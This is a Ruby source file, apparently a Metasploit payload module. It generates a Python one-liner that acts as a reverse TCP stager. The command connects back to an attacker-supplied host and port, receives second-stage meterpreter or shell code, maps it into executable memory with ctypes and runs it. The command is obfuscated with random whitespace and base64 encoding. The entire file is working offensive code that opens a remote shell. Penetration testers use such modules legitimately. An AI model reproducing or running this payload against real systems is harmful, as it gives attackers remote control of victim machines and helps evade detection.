##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP stager (via Python)',
      'Version'     => '$Revision: 0.3$',
      'Description' => 'if connects back and runs the second stager of meterpreter (or shell) via Python, replicating the behavior of the reverse_tcp stager, it needs the ip/port of the multi handler which would be giving the proper payload',
      'Author'      => 'pasta <jaguinaga@faradaysec.com>',
      'License'     => GPL_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'python3',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
    register_options([
      OptString.new('SHELL', [true, 'The kind of payload to run, could be meterpreter or shell', 'meterpreter'])
    ])
  end

  def generate
    
    if datastore['SHELL'].downcase.strip == 'meterpreter'
        payload_size = 0x7e
    elsif datastore['SHELL'].downcase.strip == 'shell'
        payload_size = 0x26
    else
        payload_size = 0x500
    end

    return super + command_string
  end

  #
  # Generate random whitespace
  #

  def random_padding
    " "*rand(10)
  end

  #
  # Generate command string
  #

  def command_string
    raw_cmd = "import socket,struct,ctypes,ctypes.util;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"#{datastore['LHOST']}\",#{datastore['LPORT']}));sc=b\"\\xbf\"+struct.pack(\"<L\",s.fileno())+s.recv(126);l=ctypes.CDLL(ctypes.util.find_library(\"c\"));l.mmap.restype=ctypes.c_void_p;l.mprotect.argtypes=[ctypes.c_void_p,ctypes.c_int,ctypes.c_int];m=l.mmap(0,len(sc),3,0x22,-1,0);ctypes.memmove(m,sc,len(sc));l.mprotect(m,len(sc),5);ctypes.CFUNCTYPE(ctypes.c_int)(m)()"
    obfuscated_cmd = raw_cmd.gsub(/,/, "#{random_padding},#{random_padding}").gsub(/;/, "#{random_padding};#{random_padding}")
    encoded_cmd = Rex::Text.encode_base64(obfuscated_cmd)
    "python3 -c \"import codecs;exec(codecs.decode(b'#{encoded_cmd}','base64'))\""
  end
end
